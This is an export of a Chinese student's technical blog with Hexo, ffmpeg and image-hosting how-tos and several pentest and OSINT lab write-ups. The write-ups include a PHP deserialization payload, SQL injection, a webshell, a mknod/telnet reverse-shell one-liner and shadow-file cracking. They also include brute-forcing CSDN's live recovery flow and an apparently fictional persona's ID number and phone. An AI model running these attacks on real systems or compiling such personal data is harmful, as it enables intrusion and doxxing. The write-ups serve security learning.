<p>在linux中重命名（更方便，重命名为1-x的顺序）</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211052001576.png" alt="image-20221105200145494"></p>
<p>这样选择，“文字”留空，“文字格式”选择“数字-文字”，确保新名称为类似01.flv的有顺序的名字</p>
<p>在当前文件夹打开终端，输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for f in *.flv; do echo &quot;file &#x27;$f&#x27;&quot; &gt;&gt; mylist.txt; done</span><br></pre></td></tr></table></figure>

<p>会有如下的txt文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211052005882.png" alt="image-20221105200531854"></p>
<p>然后继续在终端输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffmpeg -f concat -i mylist.txt -c copy output.flv</span><br></pre></td></tr></table></figure>

<p>等待完成，output.flv即为合并后的文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211052013802.png" alt="image-20221105201307761"></p>
]]></content>
      <categories>
        <category>怪东西</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建博客</title>
    <url>/2024/01/07/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h3 id="Github操作"><a href="#Github操作" class="headerlink" title="Github操作"></a>Github操作</h3><p>先申请一个名字为 <code>&lt;username&gt;.github.io</code> 的<strong>公开</strong>仓库，readme.md随意加不加</p>
<p>然后git bash绑定一下自己的账号，具体百度一堆</p>
<h3 id="本地操作"><a href="#本地操作" class="headerlink" title="本地操作"></a>本地操作</h3><p>安装一下hexo的依赖：node.js和git</p>
<p>找个地新建文件夹，在文件夹内右键打开git bash</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162050819.png" alt="image-20221016205042788"></p>
<p>然后输入以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装 hexo 框架</span><br><span class="line">npm install -g hexo-cli</span><br><span class="line"># 初始化文件夹</span><br><span class="line">hexo init</span><br><span class="line"># 安装 hexo 依赖包</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>（hexo init可能会卡在安装依赖上，挂个梯子，git上设置一下代理）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置代理</span><br><span class="line">git config --global http.proxy http://serverip:port</span><br><span class="line">git config --global https.proxy http:/serverip:port</span><br><span class="line"># 设置带用户名密码的代理</span><br><span class="line"># 注意：如果密码中带了特殊字符需要进行转义, 将特殊字符替换为下面对应的转义字符即可</span><br><span class="line">#  !   #   $   &amp;   &#x27;   (    )  *   +   ,   /   :   ;   =   ?   @   [   ]</span><br><span class="line"># %21 %23 %24 %26 %27 %28 %29 %2A %2B %2C %2F %3A %3B %3D %3F %40 %5B %5D</span><br><span class="line">npm config set proxy http://username:password@serverip:port</span><br><span class="line">npm confit set https-proxy http://username:password@serverip:port</span><br><span class="line"># 取消代理</span><br><span class="line">git config --global --unset http.proxy</span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure>

<p>执行完成之后，目录大概是这样的</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162031068.png" alt="image-20221016203139039"></p>
<p>然后在这个目录下用<code>cmd/git bash/powershell</code>执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 生成静态网站</span><br><span class="line">hexo g</span><br><span class="line"># 启动服务器</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>然后访问<code>http://localhost:4000/</code>测试是否成功</p>
<p>成功之后安装一下发布插件</p>
<p>在git bash里输入<code>npm install hexo-deployer-git</code>，安装完配置一下根目录下<code>_config.yml</code>的文件，在deploy一栏填一下发布的类型，申请的仓库地址，分支</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162043684.png" alt="image-20221016204336663"></p>
<h3 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h3><p>执行一下<code>hexo d</code>就发布好了（每次重新发布记得<code>hexo clea &amp;&amp; hexo g</code>重建一下）</p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>国内网真是哈哈了，干啥都要挂梯子、换源，有问题百度+google然后C+V就完事了</p>
]]></content>
      <categories>
        <category>配置</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建图床</title>
    <url>/2024/01/07/%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><h4 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h4><p>先在github上申请一个<strong>公开</strong>仓库</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162108241.png" alt="image-20221016210831200"></p>
<p>随便填一填然后申请，记下来仓库名字</p>
<h4 id="申请Token"><a href="#申请Token" class="headerlink" title="申请Token"></a>申请Token</h4><p>github中点开Setting-Developer settings</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162113745.png" alt="image-20221016211329717"></p>
<p>左侧选择Personal access tokens</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162114646.png" alt="image-20221016211407617"></p>
<p>权限里全选择repo，然后生成token，记下给出来的token</p>
<h2 id="Pic-Go"><a href="#Pic-Go" class="headerlink" title="Pic Go"></a>Pic Go</h2><p>下载一个PicGo：<code>https://github.com/Molunerfinn/picgo/releases</code></p>
<p>下载之后在图床设置-Github中如下设置</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162115272.png" alt="image-20221016211527242"></p>
<p>仓库名选择刚刚申请的仓库，分支填master&#x2F;main，token填刚刚申请的token</p>
<p>国内访问慢的话可以用jsdelivr的加速服务，具体百度</p>
<p>填完点选确定就好了</p>
<h2 id="Typora"><a href="#Typora" class="headerlink" title="Typora"></a>Typora</h2><p>在偏好设置-图像设置里如下设置</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162117765.png" alt="image-20221016211742739"></p>
<p>上传服务选PicGo(app)，路径选择PicGo的安装目录</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162118544.png" alt="image-20221016211820516"></p>
<p>这样设置的话每次拖放图片就可以自动调用PicGo上传</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>不得不说一下，应该是国内网的问题，typora设置了代理才能显示图片，但picgo里就算代理了也没法加载图片，不知道啥情况</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162121720.png" alt="image-20221016212153691"></p>
<p>真要玉玉了</p>
]]></content>
      <categories>
        <category>配置</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透-W1R3S</title>
    <url>/2024/01/07/%E6%B8%97%E9%80%8F-W1R3S/</url>
    <content><![CDATA[<p>由于靶机和攻击机我都设置的是nat，处在同一个网关下，所以直接用nmap找一下靶机的ip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.11.1/24</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849611.png" alt="image-20230104152533315"></p>
<p>猜测是130，再用nmap全扫一下，看看具体的版本信息、开放端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -T5 -A -p- 192.168.11.130</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849989.png" alt="image-20230104155143068"></p>
<p>显然，开了四个端口:21,22,80,3306</p>
<p>其中，ftp的21端口可以匿名登陆，里边的文件可能有用；ssh的22端口可以爆破一下用户密码；80端口给的网页，可能有漏洞或者中间件可以攻击；3306数据库可能泄露</p>
<p>先试一下ftp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp 192.168.11.130</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849045.png" alt="image-20230104160041435"></p>
<p>把所有文件扒到本地试试</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849690.png" alt="image-20230104160005641"></p>
<p>好像只有02.txt有点东西</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849893.png" alt="image-20230104160207387"></p>
<p>但base64解出来啥都不是</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849837.png" alt="image-20230104160236230"></p>
<p>既然ftp走不了，ssh也没啥思路，那就试试web</p>
<p>看到apache2.4.18，想到新生赛的中间件攻击，但是好像没有这个版本的漏洞，只能放弃中间件</p>
<p>dirb扫一下</p>
<p>扫到一堆&#x2F;administrator&#x2F;和&#x2F;wordpress&#x2F;的网址，访问看看</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849754.png" alt="image-20230104161157828"></p>
<p>是一个cuppa cms框架的安装界面</p>
<p>再找找cuppa cms有没有什么漏洞可以打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit cuppa</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849443.png" alt="image-20230104161347544"></p>
<p>只找到一个，复制出来看看具体怎么实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit -m 25971.txt</span><br><span class="line">cat 25971.txt</span><br></pre></td></tr></table></figure>

<p>看得到这个漏洞的打法，写的是可以通过这个漏洞读取非php文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849433.png" alt="image-20230104161538221"></p>
<p>参考题目的提示，那就很明显了， 试着读取登陆用户，爆破密码，然后之前找到的ssh就有用了</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849441.png" alt="image-20230104164506537"></p>
<p>把target&#x2F;cuppa改成刚刚找到ip&#x2F;administrator&#x2F;的输一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849444.png" alt="image-20230104162153636"></p>
<p>没回显</p>
<p>换用burpsuite发个post试试</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849447.png" alt="image-20230104164127035"></p>
<p>拿到passwd信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849451.png" alt="image-20230104164144631"></p>
<p>看到有一个特别的用户：w1r3s</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849343.png" alt="image-20230104164639537"></p>
<p>再读一下shadow</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849493.png" alt="image-20230104165656963"></p>
<p>存到pass.txt里，参考<a href="https://blog.csdn.net/weixin_46447549/article/details/121301645">Linux密码破解（使用hydra工具和使用john暴力破解）_国际知名观众的博客-CSDN博客_linux hydra</a></p>
<p>用john爆破</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849950.png" alt="image-20230104170005275"></p>
<p>拿到密码和用户名，再ssh登陆</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181850745.png" alt="image-20230104170238620"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su </span><br></pre></td></tr></table></figure>

<p>成功拿到root权限</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849287.png" alt="image-20230104170710939"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>考核-渗透</title>
    <url>/2024/01/07/%E8%80%83%E6%A0%B8-%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>先扫网</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.11.1/24</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181831033.png" alt="image-20230124005329665"></p>
<p>靶机是192.168.11.131</p>
<p>扫一下端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -T5 -A -p- 192.168.11.131</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181831748.png" alt="image-20230124005825745"></p>
<p>只开了22和80两个熟悉的端口和5355</p>
<p>访问80</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b1-&gt;<span class="title function_ invoke__">web</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不许反序列化哦&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;r1 . <span class="string">&#x27;  --0xfa&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;r1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;r1-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome to this game, hope you have a great day&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;c1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>dirsearch爆了一下只有flag.php，那就只能反序列化了</p>
<p>先看一下输入点，在index.php中用post方法传入cmd中</p>
<p>而最后应该利用ctf类中的getFlag函数，echo出flag</p>
<p>1.要调用getFlag，得从pwn类中的__call方法进入</p>
<p>2.要进入pwn中的__call方法，就要通过web类中__invoke()下的$this-&gt;b1-&gt;web()，令$this-&gt;b1&#x3D;new pwn()，使得web()方法成为不可用的方法进入__call中</p>
<p>3.要进入web类中__invoke()，就要把web当成一个函数调用，可以在ctf类中使用execute()函数</p>
<p>4.进入ctf类的execute()函数，可以从misc下的__toString()方法进入</p>
<p>5.要使用__toString()方法，需要从pwn类下__destruct()方法中的字符串拼接实现</p>
<p>所以反序列化链：</p>
<p>unserialize反序列化-&gt;pwn下的__destruct()方法-&gt;misc下的__toString()方法-&gt;ctf下的execute()函数-&gt;绕过web下的__wakeup()方法-&gt;web下的__invoke()方法-&gt;pwn下的__call()方法-&gt;ctf下的getFlag()函数</p>
<p>构造:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new pwn();</span><br><span class="line">$a-&gt;r1=new misc();</span><br><span class="line">$a-&gt;r1-&gt;w=new ctf();</span><br><span class="line">$a-&gt;r1-&gt;w-&gt;c1=new web();</span><br><span class="line">$a-&gt;r1-&gt;w-&gt;c1-&gt;b1=new pwn();</span><br><span class="line">$a-&gt;r1-&gt;w-&gt;c1-&gt;b1-&gt;r1=new ctf();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>得到序列后的值：O:3:”pwn”:1:{s:2:”r1”;O:4:”misc”:1:{s:1:”w”;O:3:”ctf”:1:{s:2:”c1”;O:3:”web”:1:{s:2:”b1”;O:3:”pwn”:1:{s:2:”r1”;O:3:”ctf”:1:{s:2:”c1”;N;}}}}}}</p>
<p>web后的1改为2绕过__wakeup()，得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832929.png" alt="image-20230125003958905"></p>
<p>访问：</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832523.png" alt="image-20230125004033786"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.11.131/Redr/oCk/Login.php</span><br></pre></td></tr></table></figure>



<p>中间件是apache2.4.18，没找到漏洞利用</p>
<p>dirsearch扫了一下目录，试了一下利用不太到</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832088.png" alt="image-20230125023004286"></p>
<p>在登陆框打’试试能不能sql注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832748.png" alt="image-20230125140418486"></p>
<p>能注入，但没有回显，不方便手注</p>
<p>直接上sqlmap</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832574.png" alt="image-20230125152718588"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832584.png" alt="image-20230125152729262"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832096.png" alt="image-20230125152740313"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832353.png" alt="image-20230125152747414"></p>
<p>有user表，直接看</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832242.png" alt="image-20230125152801893"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832546.png" alt="image-20230125152812017"></p>
<p>拿到账号密码</p>
<p>还有图片上传功能</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832474.png" alt="image-20230125152912999"></p>
<p>尝试之后发现好像没有对后缀进行检测，而是对MIME类型有过滤，但是我按要求传PNG文件仍然报错</p>
<p>（问过学长说不影响做题，那就dirb扫一下有什么目录</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832181.png" alt="image-20230125200554740"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833024.png" alt="image-20230125200604749"></p>
<p>蚁剑连一下，看看终端权限</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833831.png" alt="image-20230125200635200"></p>
<p>没权限，看看hint</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833348.png" alt="image-20230125220516581"></p>
<p>反弹个shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机:</span><br><span class="line">mknod a p; telnet 192.168.11.128 2222 0&lt;a | /bin/bash 1&gt;a</span><br><span class="line">攻击机:</span><br><span class="line">netcat -lvvp 2222</span><br></pre></td></tr></table></figure>

<p>或者更自动化一点，用msf</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833636.png" alt="image-20230127144100412"></p>
<p>切换到后台然后找一下漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833328.png" alt="image-20230127145533096"></p>
<p>补全一下playload</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833735.png" alt="image-20230127145629323"></p>
<p>开日</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833308.png" alt="image-20230127145654832"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833957.png" alt="image-20230127145730742"></p>
<p>拿到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181834750.png" alt="image-20230127145855166"></p>
<p>下边是手工提权然后失败的过程，还得是脚本小子好当</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833686.png" alt="image-20230126194943121"></p>
<p>试试内核漏洞然后提权</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833506.png" alt="image-20230125222934524"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181834940.png" alt="image-20230125222947820"></p>
<p>上面基本都试过了，要不就是编译的时候出问题，要不就是运行的时候就报错</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181834051.png" alt="image-20230126213257249"></p>
<p>参考：</p>
<p><a href="https://blog.csdn.net/weixin_65527369/article/details/127973141">【日常记录】解决‘GLIBC_2.34‘ not found，并且gcc制定glibc版本编译_人间体佐菲的博客-CSDN博客</a></p>
<p>在kali攻击机重新编译之后上传到靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -Wl,-rpath=&#x27;/var/www/html/Redr/oCk/upload/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64&#x27;,-dynamic-linker=&#x27;/var/www/html/Redr/oCk/upload/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/ld-linux-x86-64.so.2&#x27; -s 40762.c -o 40762 -lkeyutils</span><br></pre></td></tr></table></figure>

<p>执行没回显</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181834082.png" alt="image-20230127133929635"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>考核</tag>
      </tags>
  </entry>
  <entry>
    <title>考核-社工</title>
    <url>/2024/01/07/%E8%80%83%E6%A0%B8-%E7%A4%BE%E5%B7%A5/</url>
    <content><![CDATA[<p>qq用base64解码</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845662.png" alt="image-20230115021820488"></p>
<p>&#x3D;&#x3D;》<strong>3585956882</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845666.png" alt="image-20230115021918465"></p>
<p>恰个qq，没啥东西，看到是12月12日属羊的，合理猜测一下<strong>出生年月2003.12.12</strong></p>
<p>百度搜一下名字发现这个主页</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845680.png" alt="image-20230115022151325"></p>
<p>在base64解码一下是个ip地址:82.157.233.217</p>
<p>进去主页找到个帖子</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845799.png" alt="image-20230115022855052"></p>
<p>可知<strong>真实姓名拼音缩写为ctz</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845709.png" alt="image-20230115023848828"></p>
<p>图片的exif信息如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845706.png" alt="image-20230115025609631"></p>
<p>查了一下这个地点在海上，屁用没有</p>
<p>有几个信息点：塔像是西安大雁塔；家、塔、饭店一条直线；家离饭店近。</p>
<p>可知，拍摄角度位于大雁塔侧方，所以可以排除几个餐饮点</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845216.png" alt="image-20230115024435523"></p>
<p>西北和东南的小区和饭店隔得太远了，不像是一首真没睡就到得了，大悦城那个方向没有什么住宅区，初步觉得是在8号位置的肯德基，<strong>家住科荣花园小区</strong></p>
<p>进去后台看，提示密码在robots.txt里，打开发现是个压缩包。</p>
<p>博客的其他帖子里发了个密码字典生成器。把已知的信息填进去得到密码字典，再把这个字典用作爆破的，得到密码<strong>CTZ2003.</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845205.png" alt="image-20230115140355486"></p>
<p>进入后台拿到邮箱</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845221.png" alt="image-20230115142251161"></p>
<p><strong><a href="mailto:&#x33;&#x35;&#56;&#x35;&#57;&#x35;&#54;&#56;&#x38;&#50;&#64;&#113;&#x71;&#46;&#99;&#111;&#x6d;">&#x33;&#x35;&#56;&#x35;&#57;&#x35;&#54;&#56;&#x38;&#50;&#64;&#113;&#x71;&#46;&#99;&#111;&#x6d;</a></strong></p>
<p>有一个私密的文章，写的是四级成绩，打开对比一下ctz</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845220.png" alt="image-20230115143016638"></p>
<p><strong>真实姓名陈铁柱</strong></p>
<p><strong>身份证372522200312120019</strong></p>
<p>手机号试试用QQ的找回</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845084.png" alt="image-20230115144420294"></p>
<p>同理，在csdn上边找回一下，发现给出的信息更多</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845622.png" alt="image-20230116014611515"></p>
<p>这下只用猜中间四位了</p>
<p>用burp爆破一下这中间的四位数，由于csdn没啥验证服务，所以爆起来特别容易</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845406.png" alt="image-20230116022527859"></p>
<p>发到intruder里，构造一下payload</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845240.png" alt="image-20230116022558387"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181846464.png" alt="image-20230116022606937"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181846054.png" alt="image-20230116022439881"></p>
<p>运气比较好，中间四位不在0001-0999，而且1081离1000很近，csdn没ban我</p>
<p><strong>拿下手机号:15310815980</strong></p>
<p>彩蛋：</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181846981.png" alt="image-20230116015559155"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181846864.png" alt="image-20230116015629824"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>考核</tag>
        <tag>社工</tag>
      </tags>
  </entry>
  <entry>
    <title>python入门</title>
    <url>/2024/01/07/python%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h3 id="level0："><a href="#level0：" class="headerlink" title="level0："></a>level0：</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211021357361.png" alt="0"></p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hallo world!&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="level1"><a href="#level1" class="headerlink" title="level1:"></a>level1:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211021358848.png" alt="1"></p>
<p>代码：</p>
